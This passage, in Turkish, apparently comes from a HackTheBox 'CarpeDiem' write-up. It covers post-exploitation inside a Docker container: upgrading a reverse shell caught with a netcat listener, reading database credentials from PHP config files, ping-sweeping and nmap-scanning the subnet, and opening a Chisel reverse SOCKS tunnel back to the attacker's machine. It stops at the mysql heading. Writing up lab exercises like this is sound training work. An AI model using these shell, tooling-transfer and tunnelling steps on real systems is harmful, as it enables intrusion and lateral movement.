bash: no job control in this shell
www-data@3c371615b7aa:/var/www/html/portal/uploads$ 
```

[Script / stty](https://www.youtube.com/watch?v=DqE6DxqJg8Q) numarası ile shell'i yükselteceğim:

```
www-data@3c371615b7aa:/var/www/html/portal/uploads$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@3c371615b7aa:/var/www/html/portal/uploads$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@3c371615b7aa:/var/www/html/portal/uploads$ 
```


### CarpeDiem'de hflaccus olarak Shell

### Host Enumeration

#### Docker

Bu hostta pek bir şey yok ve açıkça bir Docker konteyneri:

* Host adı CarpeDiem değil rastgele bir string.
* System root'ta bir .dockerenv dosyası var.
* ifconfig ve ip gibi yaygın komutlar eksik.

#### General

IP adresi, ==**/proc/net/fib_trie**== dosyasından **172.17.0.6** olarak bulunabilir (ancak bir yeniden başlatma/sıfırlama durumunda son oktetin değişmesi mümkün olabilir).

==**/home**== dizininde herhangi bir kullanıcıya ait ana dizin bulunmamaktadır.

==**/var/www/html**== dizininde, bu web sunucusunun uygulama kodlarını içeren bir **==portal==** dizini vardır. ==**carpediem.htb**== üzerinde görülen "Yakında Geliyor" sitesi ise bu konteynerde mevcut görünmüyor.


#### Portal Site

Portal.carpediem.htb için kaynağa baktığımızda, root dizininde bir config.php var:

```
www-data@3c371615b7aa:/var/www/html/portal$ ls
404.html          build             index.php       privacy_policy.html
about.html        classes           initialize.php  registration.php
about.php         config.php        libs            success_booking.php
admin             dist              login.php       uploads
assets            edit_account.php  logout.php      view_bike.php
bikes.php         home.php          my_account.php  view_categories.php
book_to_rent.php  inc               plugins  
```

İçinde herhangi bir şifre yok, ancak en üstte bu satırlar var:

```
require_once('initialize.php');
require_once('classes/DBConnection.php');
```

==initialize.php== dev_oretnom adlı bir kullanıcı ve bazı DB bağlantı bilgileri hakkında bilgi içerir:

```
<?php
$dev_data = array('id'=>'-1','firstname'=>'Developer','lastname'=>'','username'=>'dev_oretnom','password'=>'5da283a2d990e8d8512cf967df5bc0d0','last_login'=>'','date_updated'=>'','date_added'=>'');
if(!defined('base_url')) define('base_url','http://portal.carpediem.htb/');
if(!defined('base_app')) define('base_app', str_replace('\\','/',__DIR__).'/' );
if(!defined('dev_data')) define('dev_data',$dev_data);
if(!defined('DB_SERVER')) define('DB_SERVER',"mysql");
if(!defined('DB_USERNAME')) define('DB_USERNAME',"portaldb");
if(!defined('DB_PASSWORD')) define('DB_PASSWORD',"J5tnqsXpyzkK4XNt");
if(!defined('DB_NAME')) define('DB_NAME',"portal");
?>
```

Parola olarak eklenen değer bir MD5 hash'i gibi görünür, ancak kırılmaz.

DBConnection.php de aynı özelliklere sahiptir:

```
<?php
if(!defined('DB_SERVER')){
    require_once("../initialize.php");
}
class DBConnection{

    private $host = 'mysql';
    private $username = 'portaldb';
    private $password = 'J5tnqsXpyzkK4XNt';
    private $database = 'portal';
    
    public $conn;
    
    public function __construct(){

        if (!isset($this->conn)) {
            
            $this->conn = new mysqli($this->host, $this->username, $this->password, $this->database);
            
            if (!$this->conn) {
                echo 'Cannot connect to database server';
                exit;
            }            
        }    
        
    }
    public function __destruct(){
        $this->conn->close();
    }
}
?>
```


### Network Enumeration

#### Ping Sweep

Bu ping taraması tek satırlık komut, aynı Class-C içinde bulunan tüm hostları bir saniyeden kısa sürede döndürecektir:

```
www-data@3c371615b7aa:/$ time for i in {1..254}; do (ping -c 1 172.17.0.${i} | grep "bytes from" | grep -v "Unreachable" &); done;
64 bytes from 172.17.0.1: icmp_seq=0 ttl=64 time=0.068 ms
64 bytes from 172.17.0.2: icmp_seq=0 ttl=64 time=0.045 ms
64 bytes from 172.17.0.3: icmp_seq=0 ttl=64 time=0.128 ms
64 bytes from 172.17.0.4: icmp_seq=0 ttl=64 time=0.038 ms
64 bytes from 172.17.0.6: icmp_seq=0 ttl=64 time=0.016 ms
64 bytes from 172.17.0.5: icmp_seq=0 ttl=64 time=0.029 ms

real    0m0.477s
user    0m0.117s
sys     0m0.056s
```


Altı host var. **.1**'in konteynerleri çalıştıran host olduğunu varsayacağım ve host enumarasyonundan bu konteynerin **.6** olduğunu biliyorum. DB sunucusu **mysql** olarak ayarlanmış, bu muhtemelen bir hostname. Onu pingleyeceğim ve IP'sinin **172.17.0.3** olduğunu göreceğim.

```
www-data@3c371615b7aa:/$ ping -c 1 mysql
PING mysql (172.17.0.3): 56 data bytes
64 bytes from 172.17.0.3: icmp_seq=0 ttl=64 time=0.084 ms
--- mysql ping statistics ---
1 packets transmitted, 1 packets received, 0% packet loss
round-trip min/avg/max/stddev = 0.084/0.084/0.084/0.000 ms
```


#### nmap

Buradan statik olarak derlenmiş bir [nmap](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap) indireceğim ve bir Python web sunucusu ve wget kullanarak konteynere yükleyeceğim. 21 saniye içinde altı hostun tamamındaki tüm portları tarıyor:

```
www-data@3c371615b7aa:/tmp$ ./nmap -p- --min-rate 10000 172.17.0.1-6

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2022-11-28 20:48 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 172.17.0.1
Host is up (0.000090s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap scan report for 172.17.0.2
Host is up (0.00047s latency).
Not shown: 65532 closed ports
PORT    STATE SERVICE
21/tcp  open  ftp
80/tcp  open  http
443/tcp open  https

Nmap scan report for mysql (172.17.0.3)
Host is up (0.00034s latency).
Not shown: 65533 closed ports
PORT      STATE SERVICE
3306/tcp  open  mysql
33060/tcp open  unknown

Nmap scan report for 172.17.0.4
Host is up (0.00034s latency).
Not shown: 65534 closed ports
PORT      STATE SERVICE
27017/tcp open  unknown

Nmap scan report for 172.17.0.5
Host is up (0.00012s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE
8118/tcp open  unknown

Nmap scan report for 3c371615b7aa (172.17.0.6)
Host is up (0.00012s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 6 IP addresses (6 hosts up) scanned in 21.00 seconds
```

#### Tunnel with Chisel

Bu noktada, bu ağa bir proxy almak için **[Chisel](https://github.com/jpillora/chisel)** yüklemek faydalı olabilir (ancak **CarpeDiem**'i bununla tamamlamak da mümkündür). **Python** ile barındıracağım ve ardından **wget** ile yükleyeceğim. Sonrasında ise sunucuyu sanal makinemde başlatacağım.

```
oxdf@hacky$ ./chisel_1.7.7_linux_amd64 server -p 8000 --reverse
2022/11/28 21:04:03 server: Reverse tunnelling enabled
2022/11/28 21:04:03 server: Fingerprint QgJndP8XXAYGo7Jf2+vSTSFH4iAa+tNYtrbWrm82J4k=
2022/11/28 21:04:03 server: Listening on http://0.0.0.0:8000
```

Ve konteynırdan bağlanacağım:

```
www-data@3c371615b7aa:/tmp$ ./chisel_1.7.7_linux_amd64 client 10.10.14.6:8000 R:socks 
2022/11/28 21:05:25 client: Connecting to ws://10.10.14.6:8000
2022/11/28 21:05:25 client: Connected (Latency 86.893335ms)
```

Hem proxychains'i hem de FoxyProxy'yi bu socks proxy'yi kullanacak şekilde yapılandıracağım ve artık bu subnet üzerindeki hostlarla etkileşime geçebileceğim. Örneğin, .1 “Coming Soon” sitesini gösteriyor:

![Pasted image 20250108061950.png](/img/user/resimler/Pasted%20image%2020250108061950.png)


#### 172.17.0.1 - host

Tipik olarak Docker'da .1 host'tur. CarpeDiem için verilen IP'de gördüklerimle eşleşmesi de durumun böyle olduğuna dair iyi bir işaret.

#### 172.17.0.2 - backdrop

nmap bu hostun HTTP (80), HTTPS (443) ve FTP (21) üzerinde dinleme yaptığını gösterdi. HTTP sitesi sadece HTTPS'ye yönlendiriyor. Bu bir [Backdrop CMS](https://backdropcms.org/) örneğidir:

![Pasted image 20250108062038.png](/img/user/resimler/Pasted%20image%2020250108062038.png)

**backdrop.carpediem.htb** hostname'ini gösteriyor. Bunu **hosts** dosyama ekleyeceğim, ancak sanal makinemden doğrudan erişemiyorum. Giriş bilgilerine sahip değilim (yukarıdaki kimlik bilgileri çalışmıyor) ve **Backdrop CMS** için doğrulama gerektirmeyen herhangi bir açık bulamıyorum.

Host üzerinde bir FTP sunucusu var ve anonim girişe izin veriyor:

```
oxdf@hacky$ proxychains ftp 172.17.0.2
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.17.0.2:21  ...  OK
Connected to 172.17.0.2.
220 (vsFTPd 3.0.3)
Name (172.17.0.2:oxdf): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

Varsayılan olarak, FTP hostuma geri dönmek için başka bir bağlantı açmaya çalışacaktır, ancak bu tünel üzerinden çalışmayacaktır. Bunu önlemek için bağlantıyı pasif moda ayarlayacağım:

```
ftp> passive
Passive mode on.
```

---

**Pasif mod** ise, veri bağlantısının sunucu tarafından başlatılmadığı, bunun yerine client'in veri bağlantısını başlattığı bir ayardır. Bu şekilde, tünel üzerinden veri transferi yapmak daha kolay olur. Yani, **pasif moda almak** FTP'nin dış bağlantı açmaya çalışmasını engelleyip, her iki tarafın da bağlantıyı başlatabileceği bir ortam sağlar.

---

Yine de, bir dizin listesi almaya çalışmak takılıyor:

```
ftp> dir
227 Entering Passive Mode (172,17,0,2,130,94).
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.17.0.2:33374  ...  OK
150 Here comes the directory listing.
```

Neler olduğu net değil, ama takılırsam geri döneceğim.


#### 172.17.0.3 - mysql
